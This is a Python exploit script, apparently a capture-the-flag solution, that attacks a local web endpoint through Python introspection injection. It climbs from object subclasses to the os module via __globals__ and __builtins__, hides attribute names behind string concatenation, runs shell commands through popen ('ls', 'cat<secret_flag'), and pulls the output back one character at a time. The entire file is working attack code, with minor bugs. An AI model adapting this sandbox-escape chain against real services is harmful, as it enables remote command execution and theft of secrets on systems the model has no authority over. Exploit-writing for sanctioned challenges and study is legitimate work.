from string import ascii_lowercase, digits
from bs4 import BeautifulSoup
from textwrap import wrap

import requests
import re

def send(command):
    url = 'http://0.0.0.0:10002/docs/'
    resp = requests.get(url + command)

    if resp.status_code == 200:
        soup = BeautifulSoup(resp.text, 'lxml')
        code = soup.findAll('code')[0]
        return code.text.strip()

def mod(text):
    text = wrap(text, len(text)/2)
    return "'{}'['__add__']('{}')".format(
        text[0], ''.join(text[1:])
    )

def craft(text):
    text = text.split('.')
    reserved = ['()', '[]']
    
    for _, __ in enumerate(text):
        if not re.search('[(.*?)]|[\[.*?\]]', __):
            text[_] = "[{}]".format(mod(__))

    return ''.join(text)

def get_length(command):
    for x in range(200):
        payload = command + '[{}]'.format(x)
        response = send(payload)
        
        if 'undefined type' in response:
          return x

def get_module(command, name='os'):
    suffix = craft(
        "__init__.__globals__.__builtins__.__import__.('{}')".format(
            name
        )
    )

    for x in range(300):
        payload = '{}[{}]{}'.format(
            cmd, x, suffix
        )

        response = send(payload)
        if response:
            if 'OS routine' in response:
                return payload

def get_text(command, length):
    result = ''

    for x in range(length):
        payload = command + "[{}]['index']('{}')"
        match = None

        for c in char:
            response = send(payload.format(x, c))
            if response:
                match = c.replace('\n', ' ')
                break
        
        if match:
            result += match
        else:
            result += '.'
    print(result)

def execute(command, action):
    payload = command + craft("popen.('{}').read.()").format(
        action
    )

    length = get_length(payload)
    content = get_text(payload, length)


char = ascii_lowercase + digits + '\n_(),=:'
cmd  = "''" + craft("__class__.__base__.__subclasses__.()")
cmd  = get_module(cmd)

execute(cmd, 'ls')
execute(cmd, 'cat<secret_flag')
